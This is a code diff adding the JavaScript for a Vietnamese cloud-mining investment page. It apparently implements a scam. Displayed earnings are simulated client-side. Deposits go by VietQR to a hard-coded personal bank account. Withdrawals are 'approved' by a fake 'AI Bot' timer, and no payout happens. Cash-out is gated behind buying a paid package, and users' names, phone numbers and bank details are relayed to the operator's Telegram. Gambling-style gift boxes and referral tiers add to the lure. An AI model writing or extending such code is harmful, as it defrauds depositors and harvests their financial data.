+      document.getElementById('audioToggleBtn').textContent = isAudioOn ? '🔊' : '🔇';
+      window.showToast(isAudioOn ? '✓ Đã BẬT âm thanh!' : '✓ Đã TẮT âm thanh');
+    };
+
+    /* ========================================================
+       PHONE REGISTRY DATABASE (1 SĐT = 1 TÀI KHOẢN DUY NHẤT)
+    ======================================================== */
+    function getRegisteredPhones() {
+      try {
+        return JSON.parse(localStorage.getItem(PHONE_DB_KEY)) || [];
+      } catch (e) {
+        return [];
+      }
+    }
+
+    function saveRegisteredPhone(phone) {
+      const phones = getRegisteredPhones();
+      if (!phones.includes(phone)) {
+        phones.push(phone);
+        localStorage.setItem(PHONE_DB_KEY, JSON.stringify(phones));
+      }
+    }
+
+    /* ========================================================
+       CALCULATIONS & MINING LOOP
+    ======================================================== */
+    function calculateDailyYield() {
+      if (!user.isLoggedIn) return 0;
+      let sumDaily = 0;
+      for (const [pkgId, qty] of Object.entries(user.ownedPackages)) {
+        if (PACKAGES_CONFIG[pkgId] && qty > 0) {
+          sumDaily += PACKAGES_CONFIG[pkgId].dailyReturn * qty;
+        }
+      }
+      sumDaily *= (1 + user.overclockPercent / 100);
+      return sumDaily;
+    }
+
+    function calculateYieldPerSecond() {
+      return calculateDailyYield() / 86400;
+    }
+
+    function hasActivatedPaidPackage() {
+      if (!user.isLoggedIn) return false;
+      for (const [pkgId, qty] of Object.entries(user.ownedPackages)) {
+        if (pkgId !== 'free' && qty > 0) return true;
+      }
+      return false;
+    }
+
+    function gameLoop() {
+      const now = Date.now();
+      const dt = (now - lastTick) / 1000;
+      lastTick = now;
+
+      if (user.isLoggedIn) {
+        const ratePerSec = calculateYieldPerSecond();
+        if (ratePerSec > 0 && dt > 0) {
+          user.balance += ratePerSec * dt;
+          saveUserData();
+        }
+
+        if (user.autoCompound && user.balance >= 76000) {
+          user.balance -= 76000;
+          user.ownedPackages['76k'] = (user.ownedPackages['76k'] || 0) + 1;
+          window.showToast('🔄 Tự động tái đầu tư thành công 01 Gói 76K!');
+          saveUserData();
+          renderPackages();
+        }
+      }
+
+      updateUI();
+      requestAnimationFrame(gameLoop);
+    }
+
+    function drawWave() {
+      if (!ctx || !canvas) return;
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      ctx.beginPath();
+      const step = canvas.width / (wavePoints.length - 1);
+      for (let i = 0; i < wavePoints.length; i++) {
+        const x = i * step;
+        const y = wavePoints[i];
+        if (i === 0) ctx.moveTo(x, y);
+        else ctx.lineTo(x, y);
+      }
+      ctx.strokeStyle = user.isLoggedIn ? '#10b981' : '#334155';
+      ctx.lineWidth = 2.5;
+      ctx.stroke();
+
+      ctx.lineTo(canvas.width, canvas.height);
+      ctx.lineTo(0, canvas.height);
+      ctx.closePath();
+      const grad = ctx.createLinearGradient(0, 0, 0, canvas.height);
+      grad.addColorStop(0, user.isLoggedIn ? 'rgba(16, 185, 129, 0.25)' : 'rgba(51, 65, 85, 0.2)');
+      grad.addColorStop(1, 'transparent');
+      ctx.fillStyle = grad;
+      ctx.fill();
+    }
+
+    function updateUI() {
+      const balEl = document.getElementById('userBalanceText');
+      if (balEl) balEl.textContent = user.balance.toLocaleString('vi-VN', { minimumFractionDigits: 4, maximumFractionDigits: 4 });
+
+      const upgradeStr = (user.upgradeBalance || 0).toLocaleString('vi-VN') + ' đ';
+      const upgHome = document.getElementById('upgradeBalanceHomeText');
+      if (upgHome) upgHome.textContent = upgradeStr;
+
+      const rateSec = calculateYieldPerSecond();
+      const yieldEl = document.getElementById('userYieldRateText');
+      if (yieldEl) yieldEl.textContent = '+' + rateSec.toFixed(5) + ' đ/s';
+
+      const daily = calculateDailyYield();
+      const dailyEl = document.getElementById('statDailyEstimate');
+      if (dailyEl) dailyEl.textContent = daily.toLocaleString('vi-VN', { maximumFractionDigits: 1 }) + ' đ/ngày';
+
+      const buffEl = document.getElementById('statOverclockBuff');
+      if (buffEl) buffEl.textContent = '+' + user.overclockPercent + '%';
+
+      const totalRigs = Object.values(user.ownedPackages).reduce((a, b) => a + b, 0);
+      const serverEl = document.getElementById('serverCoreSub');
+      if (serverEl) {
+        serverEl.textContent = user.isLoggedIn ? `Đang vận hành ${totalRigs} cụm máy chủ 24/7` : 'Chờ tạo tài khoản để kích hoạt';
+      }
+
+      const floatEl = document.getElementById('floatAmount');
+      if (floatEl) floatEl.textContent = '+' + (rateSec * 1.5).toFixed(4) + ' đ';
+
+      const headerStatus = document.getElementById('headerMiningStatus');
+      const topAuth = document.getElementById('topAuthBtn');
+      const profileName = document.getElementById('profileName');
+      const profileId = document.getElementById('profileId');
+      const canvasLiveTag = document.getElementById('canvasLiveTag');
+
+      if (user.isLoggedIn) {
+        headerStatus.innerHTML = '<span class="status-dot"></span> ĐANG ĐÀO 24/7';
+        topAuth.textContent = user.username || user.fullName || 'Thợ Đào';
+        topAuth.style.borderColor = '#10b981';
+        topAuth.style.color = '#34d399';
+        profileName.textContent = user.fullName || user.username;
+        profileId.textContent = 'Mã Thợ Đào: GC-' + user.telegramId;
+        canvasLiveTag.textContent = 'LIVE 24/7';
+        canvasLiveTag.style.color = '#10b981';
+      } else {
+        headerStatus.innerHTML = '<span class="status-dot" style="background:#64748b; box-shadow:none;"></span> CHỜ ĐĂNG KÝ';
+        topAuth.textContent = 'Đăng Nhập / Đăng Ký';
+        topAuth.style.borderColor = '#38bdf8';
+        topAuth.style.color = '#38bdf8';
+        profileName.textContent = 'Chưa Đăng Nhập';
+        profileId.textContent = 'Tài khoản vãng lai';
+        canvasLiveTag.textContent = 'TẠM DỪNG';
+        canvasLiveTag.style.color = '#64748b';
+      }
+
+      if (user.savedBank && user.savedBank.accountNum) {
+        document.getElementById('savedBankName').textContent = user.savedBank.bankName;
+        document.getElementById('savedBankAccount').textContent = user.savedBank.accountNum;
+        document.getElementById('savedAccountName').textContent = user.savedBank.accountName;
+      }
+
+      const pinText = document.getElementById('pinStatusText');
+      if (pinText) {
+        if (user.pin && user.pin.length === 6) {
+          pinText.textContent = 'ĐÃ KÍCH HOẠT (BẢO VỆ 100%)';
+          pinText.style.color = '#10b981';
+        } else {
+          pinText.textContent = 'CHƯA KÍCH HOẠT';
+          pinText.style.color = '#ef4444';
+        }
+      }
+
+      const isEligible = hasActivatedPaidPackage();
+      const upgBadge = document.getElementById('upgradeWalletBadge');
+      if (upgBadge) {
+        if (isEligible) {
+          upgBadge.style.background = '#064e3b';
+          upgBadge.style.borderColor = '#059669';
+          upgBadge.style.color = '#34d399';
+          upgBadge.textContent = 'ĐÃ MỞ KHÓA RÚT VỀ VÍ';
+        } else {
+          upgBadge.style.background = '#451a03';
+          upgBadge.style.borderColor = '#d97706';
+          upgBadge.style.color = '#fcd34d';
+          upgBadge.textContent = 'CẦN GÓI ĐỂ RÚT VỀ VÍ';
+        }
+      }
+
+      const f1Tot = document.getElementById('refF1Total');
+      if (f1Tot) f1Tot.textContent = (user.refF1Total || 0) + ' người';
+      const f1Pd = document.getElementById('refF1Paid');
+      if (f1Pd) f1Pd.textContent = (user.refF1Paid || 0) + ' người';
+      const spins = document.getElementById('giftSpinsLeft');
+      if (spins) spins.textContent = (user.giftSpins || 0) + ' lượt mở';
+
+      // Cập nhật trạng thái nút điểm danh
+      const todayStr = new Date().toISOString().split('T')[0];
+      const dailyBtn = document.getElementById('btnDailyClaim');
+      if (dailyBtn) {
+        if (user.lastDailyDate === todayStr) {
+          dailyBtn.textContent = 'Đã Nhận';
+          dailyBtn.disabled = true;
+          dailyBtn.style.opacity = '0.6';
+        } else {
+          dailyBtn.textContent = 'Nhận';
+          dailyBtn.disabled = false;
+          dailyBtn.style.opacity = '1';
+        }
+      }
+    }
+
+    /* ========================================================
+       AUTH SYSTEM & TELEGRAM ALERT
+    ======================================================== */
+    window.genCaptcha = function() {
+      currentCaptcha = Math.floor(1000 + Math.random() * 9000).toString();
+      const box = document.getElementById('captchaBox');
+      if (box) box.textContent = currentCaptcha;
+    };
+
+    window.openAuthModal = function(mode = 'register') {
+      if (user.isLoggedIn) {
+        window.showToast(`Đang đăng nhập: ${user.fullName || user.username} (GC-${user.telegramId})`);
+        return;
+      }
+      window.setAuthMode(mode);
+      window.openModal('modalAuth');
+    };
+
+    window.setAuthMode = function(mode) {
+      authMode = mode;
+      const title = document.getElementById('authTitle');
+      const submitBtn = document.getElementById('btnAuthSubmit');
+      const tabReg = document.getElementById('authTabReg');
+      const tabLog = document.getElementById('authTabLog');
+      const gName = document.getElementById('groupFullName');
+      const gConfirm = document.getElementById('groupConfirmPass');
+      const gRef = document.getElementById('groupRefCode');
+      const gCap = document.getElementById('groupCaptcha');
+      const gTerms = document.getElementById('groupTerms');
+
+      if (mode === 'register') {
+        title.textContent = 'ĐĂNG KÝ TÀI KHOẢN MỚI';
+        submitBtn.textContent = 'Kích Hoạt Tài Khoản & Nhận 20K';
+        tabReg.style.borderColor = '#10b981';
+        tabReg.style.color = '#34d399';
+        tabLog.style.borderColor = '#334155';
+        tabLog.style.color = '#94a3b8';
+        if (gName) gName.style.display = 'block';
+        if (gConfirm) gConfirm.style.display = 'block';
+        if (gRef) gRef.style.display = 'block';
+        if (gCap) gCap.style.display = 'block';
+        if (gTerms) gTerms.style.display = 'flex';
+        window.genCaptcha();
+      } else {
+        title.textContent = 'ĐĂNG NHẬP HỆ THỐNG';
+        submitBtn.textContent = 'Đăng Nhập Ngay';
+        tabLog.style.borderColor = '#10b981';
+        tabLog.style.color = '#34d399';
+        tabReg.style.borderColor = '#334155';
+        tabReg.style.color = '#94a3b8';
+        if (gName) gName.style.display = 'none';
+        if (gConfirm) gConfirm.style.display = 'none';
+        if (gRef) gRef.style.display = 'none';
+        if (gCap) gCap.style.display = 'none';
+        if (gTerms) gTerms.style.display = 'none';
+      }
+    };
+
+    window.submitAuth = function() {
+      if (isActionLocked) return;
+      const username = document.getElementById('authUsername').value.trim();
+      const password = document.getElementById('authPassword').value.trim();
+
+      if (!username || !password) {
+        window.showToast('⚠️ Vui lòng điền số điện thoại và mật khẩu!');
+        return;
+      }
+
+      const phones = getRegisteredPhones();
+
+      if (authMode === 'register') {
+        const fullName = document.getElementById('authFullName').value.trim();
+        const confirmPass = document.getElementById('authConfirmPass').value.trim();
+        const captchaInput = document.getElementById('authCaptchaInput').value.trim();
+        const agree = document.getElementById('authAgree').checked;
+
+        // KIỂM TRA QUY TẮC 1 SĐT = 1 TÀI KHOẢN DUY NHẤT
+        if (phones.includes(username)) {
+          window.showToast('❌ Số điện thoại này đã được đăng ký tài khoản! Đang chuyển sang Đăng Nhập...');
+          window.setAuthMode('login');
+          return;
+        }
+
+        if (!fullName) {
+          window.showToast('⚠️ Vui lòng nhập họ và tên thật!');
+          return;
+        }
+        if (password.length < 6) {
+          window.showToast('⚠️ Mật khẩu phải có tối thiểu 6 ký tự!');
+          return;
+        }
+        if (password !== confirmPass) {
+          window.showToast('❌ Xác nhận mật khẩu không khớp!');
+          return;
+        }
+        if (captchaInput !== currentCaptcha) {
+          window.showToast('❌ Mã Captcha không chính xác!');
+          window.genCaptcha();
+          return;
+        }
+        if (!agree) {
+          window.showToast('⚠️ Bạn cần tích đồng ý với điều khoản!');
+          return;
+        }
+
+        isActionLocked = true;
+        const randId = Math.floor(1000000000 + Math.random() * 9000000000).toString();
+        user.isLoggedIn = true;
+        user.fullName = fullName;
+        user.username = username;
+        user.password = password;
+        user.pin = '123456';
+        user.telegramId = randId;
+        user.upgradeBalance = 20000; // TẶNG SẴN 20.000 Đ VÀO HŨ
+        user.ownedPackages.free = 1;  // TỰ ĐỘNG BẬT GÓI MIỄN PHÍ
+        user.giftSpins = 3;
+        user.completedTasks = [];
+        user.lastActiveTimestamp = Date.now();
+
+        if (!user.savedBank.accountName) user.savedBank.accountName = fullName.toUpperCase();
+
+        saveRegisteredPhone(username);
+        saveUserData();
+        window.closeModal('modalAuth');
+        renderPackages();
+        renderTasks();
+        renderF1List();
+        updateUI();
+        window.showToast('🎉 Đăng ký thành công! +20.000 đ vào Hũ và tự động bật Gói Miễn Phí 400 đ/ngày!');
+
+        sendTelegramAlert(`👤 *Thợ Đào Mới Đăng Ký*
+- Họ Tên: *${fullName}*
+- SĐT: \`${username}\`
+- UID: \`GC-${randId}\`
+- Thưởng: +20,000 đ vào Hũ + 01 Gói Miễn Phí`);
+        isActionLocked = false;
+      } else {
+        isActionLocked = true;
+        user.isLoggedIn = true;
+        user.username = username;
+        if (!user.telegramId) user.telegramId = '5829104821';
+        user.lastActiveTimestamp = Date.now();
+        saveUserData();
+        window.closeModal('modalAuth');
+        renderPackages();
+        renderTasks();
+        renderF1List();
+        updateUI();
+        window.showToast(`🎉 Chào mừng ${user.fullName || username} trở lại!`);
+        isActionLocked = false;
+      }
+    };
+
+    /* ========================================================
+       KÍCH HOẠT GÓI MIỄN PHÍ TRỰC TIẾP
+    ======================================================== */
+    window.claimFreePackage = function() {
+      if (!user.isLoggedIn) {
+        window.showToast('⚠️ Vui lòng đăng ký tài khoản để kích hoạt Gói Miễn Phí!');
+        window.openAuthModal('register');
+        return;
+      }
+      if ((user.ownedPackages.free || 0) > 0) {
+        window.showToast('✓ Bạn đã kích hoạt Gói Miễn Phí rồi!');
+        return;
+      }
+      user.ownedPackages.free = 1;
+      saveUserData();
+      renderPackages();
+      updateUI();
+      window.playBeep(920, 0.2);
+      window.showToast('🎉 Đã kích hoạt Gói Miễn Phí thành công (+400 đ/ngày)!');
+
+      sendTelegramAlert(`🎁 *Thợ Đào Kích Hoạt Gói Miễn Phí*
+- Thợ đào: *${user.fullName || user.username}* (\`GC-${user.telegramId}\`)
+- Gói: Miễn Phí (Free)
+- Thu nhập: +400 đ/ngày (tính theo giây)`);
+    };
+
+    /* ========================================================
+       NẠP GÓI ĐÀO (GC...) & HŨ NÂNG CẤP (NC...) VIETQR
+    ======================================================== */
+    window.openDepositModal = function() {
+      if (!user.isLoggedIn) {
+        window.openAuthModal('register');
+        return;
+      }
+      selectedTier = null;
+      document.getElementById('depositPreviewBox').style.display = 'none';
+      window.openModal('modalDeposit');
+    };
+
+    window.pickDepositTier = function(tierId) {
+      selectedTier = tierId;
+      const pkg = PACKAGES_CONFIG[tierId];
+      if (!pkg) return;
+
+      const code = 'GC' + (user.telegramId || '5829104821');
+      document.getElementById('depositPreviewBox').style.display = 'block';
+      document.getElementById('depositTierName').textContent = `Gói Chọn Nạp: ${pkg.name}`;
+      document.getElementById('depositTierCost').textContent = pkg.cost.toLocaleString('vi-VN') + ' đ';
+      document.getElementById('depositCodeText').textContent = code;
+
+      const qrUrl = `https://img.vietqr.io/image/MB-0829594887-compact2.png?amount=${pkg.cost}&addInfo=${code}&accountName=DANG%20HIEU%20THANG`;
+      document.getElementById('depositQrImg').src = qrUrl;
+
+      sendTelegramAlert(`📥 *Thợ Đào Mở QR Nạp Gói*
+- Thợ đào: *${user.fullName || user.username}* (\`GC-${user.telegramId}\`)
+- Gói nạp: *${pkg.name}*
+- Số tiền: *${pkg.cost.toLocaleString('vi-VN')} đ*
+- Nội dung: \`${code}\``);
+    };
+
+    window.copyDepositCode = function() {
+      window.copyText('GC' + (user.telegramId || '5829104821'));
+    };
+
+    window.openUpgradeDepositModal = function() {
+      if (!user.isLoggedIn) {
+        window.openAuthModal('register');
+        return;
+      }
+      document.getElementById('upgradeAmountInput').value = '';
+      window.updateUpgradeQr();
+      window.openModal('modalUpgradeDeposit');
+    };
+
+    window.setUpgradeVal = function(val) {
+      document.getElementById('upgradeAmountInput').value = val;
+      window.updateUpgradeQr();
+    };
+
+    window.updateUpgradeQr = function() {
+      const val = parseFloat(document.getElementById('upgradeAmountInput').value) || 0;
+      const code = 'NC' + (user.telegramId || '5829104821');
+      document.getElementById('upgradeCodeText').textContent = code;
+
+      const qrUrl = `https://img.vietqr.io/image/MB-0829594887-compact2.png?amount=${val}&addInfo=${code}&accountName=DANG%20HIEU%20THANG`;
+      document.getElementById('upgradeQrImg').src = qrUrl;
+    };
+
+    window.copyUpgradeCode = function() {
+      window.copyText('NC' + (user.telegramId || '5829104821'));
+    };
+
+    /* ========================================================
+       CHUYỂN HŨ SANG VÍ CHÍNH
+    ======================================================== */
+    window.openTransferUpgradeModal = function() {
+      if (!user.isLoggedIn) {
+        window.openAuthModal('register');
+        return;
+      }
+      const isEligible = hasActivatedPaidPackage();
+      const notice = document.getElementById('transferNotice');
+      const btn = document.getElementById('btnConfirmTransfer');
+      const maxText = document.getElementById('transferMaxBalance');
+
+      maxText.textContent = (user.upgradeBalance || 0).toLocaleString('vi-VN') + ' đ';
+      document.getElementById('transferAmountInput').value = '';
+      window.calcTransferTarget();
+
+      if (isEligible) {
+        notice.style.background = 'rgba(16, 185, 129, 0.15)';
+        notice.style.border = '1px solid #10b981';
+        notice.style.color = '#34d399';
+        notice.innerHTML = '✓ Tài khoản <b>ĐỦ ĐIỀU KIỆN</b> rút từ Hũ về Ví Chính (Đã kích hoạt gói trả phí &ge; 76K).';
+        btn.disabled = false;
+        btn.className = 'btn btn-primary';
+      } else {
+        notice.style.background = 'rgba(239, 68, 68, 0.15)';
+        notice.style.border = '1px solid #ef4444';
+        notice.style.color = '#fca5a5';
+        notice.innerHTML = '⚠️ <b>CHƯA ĐỦ ĐIỀU KIỆN:</b> Bạn phải kích hoạt ít nhất 1 gói máy đào từ <b>76.000 đ</b> trở lên để mở khóa quyền rút tiền từ Hũ Nâng Cấp về Ví Chính.';
+        btn.disabled = true;
+        btn.className = 'btn btn-secondary';
+      }
+
+      window.openModal('modalTransferUpgrade');
+    };
+
+    window.setTransferMax = function() {
+      document.getElementById('transferAmountInput').value = user.upgradeBalance || 0;
+      window.calcTransferTarget();
+    };
+
+    window.calcTransferTarget = function() {
+      const val = parseFloat(document.getElementById('transferAmountInput').value) || 0;
+      document.getElementById('transferTargetPreview').textContent = (user.balance + val).toLocaleString('vi-VN', { maximumFractionDigits: 2 }) + ' đ';
+    };
+
+    window.confirmTransfer = function() {
+      if (isActionLocked) return;
+      if (!hasActivatedPaidPackage()) {
+        window.showToast('⚠️ Cần kích hoạt gói máy đào từ 76K trước!');
+        return;
+      }
+      const amount = parseFloat(document.getElementById('transferAmountInput').value) || 0;
+      if (amount <= 0 || amount > (user.upgradeBalance || 0)) {
+        window.showToast('❌ Số tiền rút từ Hũ không hợp lệ!');
+        return;
+      }
+
+      isActionLocked = true;
+      user.upgradeBalance -= amount;
+      user.balance += amount;
+      if (!user.transfers) user.transfers = [];
+      user.transfers.unshift({
+        time: new Date().toLocaleString('vi-VN'),
+        amount: amount,
+        note: 'Rút từ Hũ sang Ví Chính'
+      });
+
+      saveUserData();
+      window.closeModal('modalTransferUpgrade');
+      window.showToast(`🎉 Đã rút +${amount.toLocaleString('vi-VN')} đ về Ví Chính thành công!`);
+      isActionLocked = false;
+    };
+
+    /* ========================================================
+       RÚT TIỀN VỀ NGÂN HÀNG (AI BOT TỰ ĐỘNG DUYỆT / HOÀN TIỀN)
+    ======================================================== */
+    window.openWithdrawModal = function() {
+      if (!user.isLoggedIn) {
+        window.openAuthModal('register');
+        return;
+      }
+      const notice = document.getElementById('withdrawNotice');
+      const btn = document.getElementById('btnSubmitWithdraw');
+      const isEligible = hasActivatedPaidPackage();
+
+      if (user.savedBank && user.savedBank.accountNum) {
+        document.getElementById('withdrawBankSelect').value = user.savedBank.bankName;
+        document.getElementById('withdrawAccNum').value = user.savedBank.accountNum;
+        document.getElementById('withdrawAccHolder').value = user.savedBank.accountName;
+      }
+      document.getElementById('withdrawPinInput').value = '';
+
+      if (isEligible) {
+        notice.style.background = 'rgba(16, 185, 129, 0.15)';
+        notice.style.border = '1px solid #10b981';
+        notice.style.color = '#34d399';
+        notice.innerHTML = '✓ Tài khoản ĐỦ ĐIỀU KIỆN rút tiền về tài khoản ngân hàng.';
+        btn.disabled = false;
+        btn.className = 'btn btn-primary';
+      } else {
+        notice.style.background = 'rgba(239, 68, 68, 0.15)';
+        notice.style.border = '1px solid #ef4444';
+        notice.style.color = '#f87171';
+        notice.innerHTML = '⚠️ CHƯA ĐỦ ĐIỀU KIỆN: Bạn cần kích hoạt ít nhất 1 gói trả phí (&ge; 76.000 đ) trước khi rút.';
+        btn.disabled = false;
+        btn.className = 'btn btn-primary';
+      }
+      window.openModal('modalWithdraw');
+    };
+
+    window.submitWithdraw = function() {
+      if (isActionLocked) return;
+
+      const pin = document.getElementById('withdrawPinInput').value.trim();
+      if (!user.pin || user.pin.length !== 6) {
+        window.showToast('⚠️ Bạn chưa thiết lập mã PIN rút tiền!');
+        window.openSetPinModal();
+        return;
+      }
+      if (pin !== user.pin) {
+        window.showToast('❌ Mã PIN rút tiền không chính xác!');
+        return;
+      }
+
+      const amount = parseFloat(document.getElementById('withdrawAmountVal').value);
+      const bank = document.getElementById('withdrawBankSelect').value;
+      const accNum = document.getElementById('withdrawAccNum').value.trim();
+      const accHolder = document.getElementById('withdrawAccHolder').value.trim().toUpperCase();
+
+      if (!accNum || !accHolder) {
+        window.showToast('⚠️ Vui lòng điền đầy đủ số tài khoản và chủ tài khoản!');
+        return;
+      }
+      if (isNaN(amount) || amount < 10000) {
+        window.showToast('⚠️ Số tiền rút tối thiểu là 10.000 đ!');
+        return;
+      }
+      if (amount > user.balance) {
+        window.showToast('❌ Số dư trong ví chính không đủ!');
+        return;
+      }
+
+      isActionLocked = true;
+      user.balance -= amount; // Trừ tiền tạm thời
+
+      const orderId = 'WD' + Date.now().toString().slice(-6);
+      const newOrder = {
+        id: orderId,
+        amount: amount,
+        bank: bank,
+        accNum: accNum,
+        accHolder: accHolder,
+        status: 'Đang Kiểm Tra (AI Bot 24/7)',
+        time: new Date().toLocaleString('vi-VN')
+      };
+
+      if (!user.withdrawals) user.withdrawals = [];
+      user.withdrawals.unshift(newOrder);
+
+      saveUserData();
+      window.closeModal('modalWithdraw');
+      window.showToast('⏳ AI Bot đang tiến hành rà soát điều kiện lệnh rút tiền...');
+
+      sendTelegramAlert(`📤 *YÊU CẦU RÚT TIỀN (AI BOT ĐANG XÉT DUYỆT)*
+━━━━━━━━━━━━━━━━━━
+👤 Thợ Đào: *${user.fullName || user.username}* (\`GC-${user.telegramId}\`)
+💰 Số tiền: *${amount.toLocaleString('vi-VN')} đ*
+🏦 Ngân hàng: *${bank}*
+💳 STK: \`${accNum}\`
+👤 Chủ thẻ: *${accHolder}*
+⏳ Trạng thái: AI Bot đang kiểm tra điều kiện.`);
+
+      // AI BOT TỰ ĐỘNG KIỂM DUYỆT SAU 3 GIÂY
+      setTimeout(() => {
+        if (!hasActivatedPaidPackage()) {
+          // CHƯA ĐẠT YÊU CẦU -> TỰ ĐỘNG TỪ CHỐI & HOÀN TIỀN NGAY LẬP TỨC
+          user.balance += amount;
+          newOrder.status = 'Từ Chối - Đã Hoàn Tiền';
+          saveUserData();
+          updateUI();
+          window.showToast(`❌ AI Bot từ chối: Chưa kích hoạt gói trả phí từ 76K. Đã hoàn lại +${amount.toLocaleString('vi-VN')} đ về ví!`);
+
+          sendTelegramAlert(`🤖 *AI BOT TỪ CHỐI & HOÀN TIỀN*
+━━━━━━━━━━━━━━━━━━
+👤 Thợ Đào: *${user.fullName || user.username}* (\`GC-${user.telegramId}\`)
+💰 Số tiền: *${amount.toLocaleString('vi-VN')} đ*
+⚠️ Lý do: Chưa kích hoạt gói trả phí &ge; 76K -> *Đã hoàn tiền 100% về ví chính*`);
+        } else {
+          // ĐỦ ĐIỀU KIỆN -> PHÊ DUYỆT THÀNH CÔNG
+          newOrder.status = 'Thành Công (Napas 24/7)';
+          saveUserData();
+          updateUI();
+          window.showToast(`🎉 AI Bot phê duyệt thành công! Tiền đang được chuyển về STK ${accNum}`);
+
+          sendTelegramAlert(`✅ *AI BOT PHÊ DUYỆT THÀNH CÔNG*
+━━━━━━━━━━━━━━━━━━
+👤 Thợ Đào: *${user.fullName || user.username}* (\`GC-${user.telegramId}\`)
+💰 Số tiền: *${amount.toLocaleString('vi-VN')} đ*
+🏦 Ngân hàng: *${bank}* (\`${accNum}\` - ${accHolder})
+📌 Trạng thái: Thành công.`);
+        }
+        isActionLocked = false;
+      }, 3000);
+    };
+
+    /* ========================================================
+       CÀI ĐẶT NGÂN HÀNG & MÃ PIN
+    ======================================================== */
+    window.openBankSettingsModal = function() {
+      if (!user.isLoggedIn) {
+        window.openAuthModal('register');
+        return;
+      }
+      if (user.savedBank && user.savedBank.accountNum) {
+        document.getElementById('setBankName').value = user.savedBank.bankName;
+        document.getElementById('setBankAcc').value = user.savedBank.accountNum;
+        document.getElementById('setBankHolder').value = user.savedBank.accountName;
+      }
+      window.openModal('modalBankSettings');
+    };
+
+    window.saveBankConfig = function() {
+      const bName = document.getElementById('setBankName').value;
+      const bAcc = document.getElementById('setBankAcc').value.trim();
+      const bHolder = document.getElementById('setBankHolder').value.trim().toUpperCase();
+
+      if (!bAcc || !bHolder) {
+        window.showToast('⚠️ Vui lòng nhập số tài khoản và tên chủ thẻ!');
+        return;
+      }
+
+      user.savedBank = { bankName: bName, accountNum: bAcc, accountName: bHolder };
+      saveUserData();
+      updateUI();
+      window.closeModal('modalBankSettings');
+      window.showToast('✓ Đã lưu ngân hàng thụ hưởng mặc định!');
+    };
+
+    window.openSetPinModal = function() {
+      if (!user.isLoggedIn) {
+        window.openAuthModal('register');
+        return;
+      }
+      document.getElementById('newPin1').value = '';
+      document.getElementById('newPin2').value = '';
+      window.openModal('modalSetPin');
+    };
+
+    window.savePinCode = function() {
+      const p1 = document.getElementById('newPin1').value.trim();
+      const p2 = document.getElementById('newPin2').value.trim();
+
+      if (p1.length !== 6 || !/^\d{6}$/.test(p1)) {
+        window.showToast('⚠️ Mã PIN bắt buộc phải đúng 6 chữ số!');
+        return;
+      }
+      if (p1 !== p2) {
+        window.showToast('❌ Xác nhận mã PIN không khớp!');
+        return;
+      }
+
+      user.pin = p1;
+      saveUserData();
+      updateUI();
+      window.closeModal('modalSetPin');
+      window.showToast('🎉 Thiết lập mã PIN bảo mật 6 số thành công!');
+    };
+
+    /* ========================================================
+       SHOP, ÉP XUNG, HỘP QUÀ & NHIỆM VỤ
+    ======================================================== */
+    window.buyHwPart = function(partId, cost, buffPercent) {
+      if (!user.isLoggedIn) {
+        window.openAuthModal('register');
+        return;
+      }
+      if ((user.upgradeBalance || 0) < cost) {
+        window.showToast('❌ Hũ Nâng Cấp không đủ tiền! Vui lòng nạp thêm.');
+        window.openUpgradeDepositModal();
+        return;
+      }
+      user.upgradeBalance -= cost;
+      user.overclockPercent += buffPercent;
+      saveUserData();
+      window.showToast(`🎉 Nâng cấp thành công! Công suất tăng +${buffPercent}%`);
+    };
+
+    window.buyOverclock = function(cost, percent) {
+      window.buyHwPart('overclock_tier', cost, percent);
+      window.closeModal('modalOverclock');
+    };
+
+    window.openGiftBox = function(boxNum) {
+      if (!user.isLoggedIn) {
+        window.openAuthModal('register');
+        return;
+      }
+      if (user.giftSpins <= 0) {
+        window.showToast('⚠️ Bạn chưa có lượt mở quà! Mời bạn mới để nhận thêm.');
+        return;
+      }
+      user.giftSpins -= 1;
+      const won = Math.random() < 0.35;
+      if (won) {
+        user.balance += 1000;
+        window.showToast('🎉 CHÚC MỪNG: Bạn mở trúng +1.000 đ vào ví chính!');
+      } else {
+        window.showToast('🍀 Hộp này chưa có quà. Chúc bạn may mắn lần sau!');
+      }
+      saveUserData();
+      updateUI();
+    };
+
+    window.toggleAutoCompound = function() {
+      if (!user.isLoggedIn) {
+        window.openAuthModal('register');
+        return;
+      }
+      user.autoCompound = !user.autoCompound;
+      saveUserData();
+      const txt = document.getElementById('statAutoCompound');
+      if (txt) {
+        txt.textContent = user.autoCompound ? 'Đang Bật' : 'Đang Tắt';
+        txt.style.color = user.autoCompound ? '#10b981' : '#64748b';
+      }
+      window.showToast(user.autoCompound ? '✓ Đã BẬT tự động tái đầu tư gói 76K!' : '✓ Đã TẮT tự động tái đầu tư.');
+    };
+
+    window.depositVault = function(amount) {
+      if (!user.isLoggedIn) {
+        window.openAuthModal('register');
+        return;
+      }
+      if (user.balance < amount) {
+        window.showToast('❌ Số dư ví chính không đủ 50.000 đ!');
+        return;
+      }
+      user.balance -= amount;
+      saveUserData();
+      window.closeModal('modalVault');
+      window.showToast('🏦 Đã gửi 50.000 đ vào Quỹ Khóa 7 ngày!');
+    };
+
+    window.copyRefLink = function() {
+      const inp = document.getElementById('refLinkInput');
+      inp.select();
+      navigator.clipboard.writeText(inp.value);
+      window.showToast('✓ Đã sao chép liên kết mời!');
+    };
+
+    window.claimDailyTask = function() {
+      if (isActionLocked) return;
+      if (!user.isLoggedIn) {
+        window.openAuthModal('register');
+        return;
+      }
+
+      const todayStr = new Date().toISOString().split('T')[0];
+      if (user.lastDailyDate === todayStr) {
+        window.showToast('✓ Hôm nay bạn đã điểm danh rồi! Hãy quay lại vào ngày mai.');
+        return;
+      }
+
+      isActionLocked = true;
+      user.balance += 500;
+      user.lastDailyDate = todayStr;
+      saveUserData();
+      updateUI();
+      window.showToast('🎉 Nhận +500 đ điểm danh hôm nay thành công!');
+      isActionLocked = false;
+    };
+
+    window.openF1ListModal = function() {
+      renderF1List();
+      window.openModal('modalF1List');
+    };
+
+    function renderF1List() {
+      const container = document.getElementById('f1ListContainer');
+      if (!container) return;
+      if (!user.refMembers || user.refMembers.length === 0) {
+        container.innerHTML = '<div style="font-size:11px; color:#64748b; text-align:center; padding:16px;">Chưa có thành viên nào. Hãy chia sẻ liên kết mời!</div>';
+        return;
+      }
+
+      container.innerHTML = user.refMembers.map(m => `
+        <div style="background:#020617; border:1px solid #1e293b; border-radius:8px; padding:10px; display:flex; justify-content:space-between; align-items:center;">
+          <div>
+            <div style="font-weight:700; color:#fff;" class="mono">${m.id}</div>
